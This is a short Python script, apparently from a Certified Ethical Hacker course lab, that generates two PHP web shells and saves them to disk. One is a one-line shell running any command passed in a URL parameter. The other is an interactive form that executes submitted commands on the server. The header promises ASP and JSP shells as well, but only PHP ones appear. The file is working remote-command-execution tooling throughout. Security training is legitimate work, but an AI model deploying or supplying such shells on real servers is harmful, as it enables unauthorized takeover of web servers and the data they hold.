#!/usr/bin/env python3
# LAB-ONLY: Web Shell Generator
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates simple web shells for PHP, ASP, JSP, etc.
import sys

def generate_web_shells():
    shells = []
    # PHP Simple
    php_simple = '''<?php system($_GET['c']);?>'''
    shells.append(("PHP Simple", php_simple, "shell.php"))
    # PHP Interactive
    php_interactive = '''<?php
if(isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}
?>
<html>
<body>
<form method="POST">
<input type="text" name="cmd" placeholder="Command">
<input type="submit" value="Execute">
</form>
</body>
</html>'''
    shells.append(("PHP Interactive", php_interactive, "shell-interactive.php"))
    return shells

def main():
    print("="*80)
    print("LAB-ONLY: Web Shell Generator")
    print("="*80)
    for name, code, filename in generate_web_shells():
        print(f"\n[*] {name}")
        print("-"*40)
        print(code)
        print()
        with open(filename, "w") as f:
            f.write(code)
        print(f"[+] Saved to {filename}")

if __name__ == "__main__":
    main()
